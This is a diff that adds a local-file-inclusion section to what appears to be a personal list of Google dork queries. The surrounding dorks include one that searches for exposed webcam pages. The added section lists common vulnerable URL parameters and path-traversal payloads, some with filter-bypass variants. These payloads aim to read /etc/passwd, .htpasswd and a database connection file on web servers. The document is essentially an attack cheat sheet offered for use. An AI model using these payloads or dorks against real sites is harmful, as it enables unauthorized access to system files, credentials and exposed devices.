@@ -42,3 +42,33 @@ intitle:"active webcam page"
 
 site:researchforaction.org and "download"
 inurl:"index.php?page="  lars-seeberg
+
+# LFE
+
+?cat=
+?dir=
+?action=
+?date=
+?detail=
+?file=
+?download=
+?path=
+?folder=
+?prefix=
+?include=
+?page=
+?locate=
+?doc=
+?site=
+?view=
+?content=
+?document=
+?layout=
+
+https://example.com/?helpfile=login.txt
+?file=….//….//etc/passwd
+?file=..///////..////..//////etc/passwd
+?file=..///////..////..//////etc/passwd
+https://example.com/?helpfile=../secret/.htpasswd
+https://example.com/?download=../include/connection.php
+
